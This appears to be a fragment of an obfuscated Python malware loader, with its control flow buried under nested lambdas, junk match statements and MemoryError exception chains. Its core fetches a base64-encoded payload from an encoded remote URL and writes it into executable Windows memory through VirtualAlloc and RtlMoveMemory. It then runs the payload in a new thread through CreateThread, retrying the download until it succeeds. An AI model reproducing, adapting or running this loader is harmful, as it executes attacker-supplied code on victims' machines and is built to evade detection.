        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _84: _84 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1410 = [[(lambda: (lambda _31: _31 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _173: _173 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _815: _815 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1019:
        try:
            raise MemoryError(__7843251511909)
        except MemoryError as __7109619701782:
            if __7109619701782.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __7109619701782.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6899229805124 = (lambda: R_E_D__A_V(b'R_E_D__A_V__y`\xd6\x16\x91\x01'))()
            if __7109619701782.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7139210078174 = (lambda: R_E_D__A_V(b'R_E_D__A_V__y+\xbe1\x01U'))()
try:
    match '1016' == '157':
        case True:
            raise MemoryError([True])
        case False:
            _1815 = [[True], [False]]
            R_E_D__A_V______(['_32'])
    raise MemoryError([True])
except MemoryError as _196:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _102: _102 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _79 = [[(lambda: (lambda _1418: _1418 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _63: _63 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _139: _139 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _85:
        while (lambda: (lambda _21: _21 + (lambda: ______R_E_D__A_V_______((lambda: R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy2'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyS'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyS'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyT'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyX'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyD'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyM'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy^'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyO'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyT'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyQ'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyD'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue